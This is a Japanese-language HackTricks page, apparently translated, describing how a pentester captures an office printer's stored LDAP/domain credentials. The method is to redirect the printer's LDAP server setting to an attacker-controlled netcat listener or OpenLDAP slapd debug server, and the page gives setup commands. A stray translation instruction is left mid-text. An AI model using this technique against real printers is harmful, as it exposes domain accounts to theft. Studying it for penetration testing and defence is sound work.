<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>


インターネット上には、LDAPをデフォルト/弱いログオン資格情報で設定したプリンターの危険性を**強調するブログがいくつかあります**。\
これは、攻撃者がプリンターをだまして悪質なLDAPサーバーに対して認証させる（通常は`nc -vv -l -p 444`で十分です）ことで、プリンターの**クリアテキストの資格情報をキャプチャする**可能性があるためです。

また、いくつかのプリンターには**ユーザー名のログが含まれている**ことがあり、ドメインコントローラーから**すべてのユーザー名をダウンロードする**こともできるかもしれません。

このような**機密情報**と一般的な**セキュリティの欠如**は、攻撃者にとってプリンターを非常に興味深いものにします。

このトピックに関するいくつかのブログ:

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**以下の情報は** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/) **からコピーされました**

# LDAP設定

Konica Minoltaのプリンターでは、LDAPサーバーに接続するための設定と資格情報を設定することができます。これらのデバイスの以前のファームウェアバージョンでは、ページのhtmlソースを読むだけで資格情報を回復できると聞いています。しかし、現在では資格情報はインターフェースで返されないため、もう少し努力が必要です。

LDAPサーバーのリストは、Network > LDAP Setting > Setting Up LDAPの下にあります。

インターフェースでは、接続に使用される資格情報を再入力せずにLDAPサーバーを変更することができます。これはよりシンプルなユーザーエクスペリエンスのためだと思われますが、攻撃者がプリンターのマスターからドメインへの足がかりを得る機会を与えています。

「Test Connection」機能を使って、LDAPサーバーのアドレス設定を自分たちがコントロールするマシンに再設定し、接続をトリガーすることができます。

# 情報を待ち受ける

## netcat

私よりも運が良ければ、シンプルなnetcatリスナーで済むかもしれません:
```
sudo nc -k -v -l -p 386
```
以下は、ハッキング技術に関するハッキングの本の内容です。ファイル windows-hardening/active-directory-methodology/ad-information-in-printers.md の関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

[\@_castleinthesky](https://twitter.com/_castleinthesky)によると、これはほとんどの場合に機能すると確信していますが、私はまだそのように簡単には解放されたことがありません。

## Slapd

プリンターは最初にnull bindを試み、その後利用可能な情報を照会します。これらの操作が成功した場合にのみ、資格情報を使用してbindを試みます。そのため、完全なLDAPサーバーが必要であることがわかりました。

要件を満たすシンプルなldapサーバーを探しましたが、選択肢は限られているようでした。結局、open ldapサーバーを設定し、slapdデバッグサーバーサービスを使用して接続を受け入れ、プリンターからのメッセージを出力することにしました。（もしもっと簡単な代替案をご存知であれば、教えていただけると嬉しいです）

### インストール

（このセクションは、こちらのガイド [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora_26&p=openldap) を若干修正したバージョンです）

root端末から：

**OpenLDAPをインストールします。**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**OpenLDAPの管理者パスワードを設定する（間もなく再度必要になります）**
```
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**基本スキーマのインポート**
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**LDAP DBにドメイン名を設定します。**
```
# generate directory manager's password
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**LDAP TLSの設定**

**SSL証明書の作成**
```
#> cd /etc/pki/tls/certs
#> make server.key
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**SlapdのSSL/TLS設定**
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**ローカルファイアウォールを通じてLDAPを許可する**
```
firewall-cmd --add-service={ldap,ldaps}
```
## 報酬

LDAPサービスをインストールして設定した後、以下のコマンドで実行できます：

> ```
> slapd -d 2
> ```

以下のスクリーンショットは、プリンターで接続テストを実行したときの出力の例を示しています。LDAPクライアントからサーバーへユーザー名とパスワードが渡されていることがわかります。

![slapd terminal output containing the username "MyUser" and password "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# どれほど悪いことが起こり得るのか？

これは設定されているクレデンシャルに大きく依存します。

最小権限の原則が守られている場合、アクティブディレクトリの特定の要素に対して読み取りアクセスのみを得るかもしれません。これはしばしば価値があり、その情報を使用してさらに正確な攻撃を策定することができます。

通常、ドメインユーザーグループのアカウントを取得する可能性が高く、これにより機密情報へのアクセスが可能になったり、他の攻撃のための事前認証が形成されることがあります。

あるいは、私のように、LDAPサーバーを設定する報酬として、ドメイン管理者アカウントを銀の盆に乗せて手渡されるかもしれません。


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>
